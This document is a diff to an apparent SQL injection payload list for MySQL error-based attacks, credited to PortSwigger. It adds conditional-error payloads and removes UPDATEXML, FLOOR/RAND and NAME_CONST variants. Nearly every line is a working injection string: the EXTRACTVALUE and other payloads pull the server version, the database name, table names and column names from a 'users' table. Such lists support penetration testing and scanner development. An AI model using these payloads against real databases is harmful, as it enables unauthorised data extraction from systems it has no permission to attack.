@@ -1,6 +1,10 @@
 # MySQL — Error-Based Payloads
 # Source: PortSwigger, manual curation
 
+# --- Conditional errors (PortSwigger) ---
+' AND IF(1=1,(SELECT table_name FROM information_schema.tables),'a')--
+' AND IF(1=2,(SELECT table_name FROM information_schema.tables),'a')--
+
 # --- EXTRACTVALUE (most reliable) ---
 ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
 ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
@@ -8,15 +12,3 @@
 ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--
 ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))--
 
-# --- UPDATEXML ---
-' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
-' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
-' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
-' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)),1)--
-
-# --- FLOOR/RAND (older MySQL) ---
-' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
-' UNION SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x--
-
-# --- NAME_CONST ---
-' AND (SELECT * FROM (SELECT NAME_CONST(version(),1))x)--
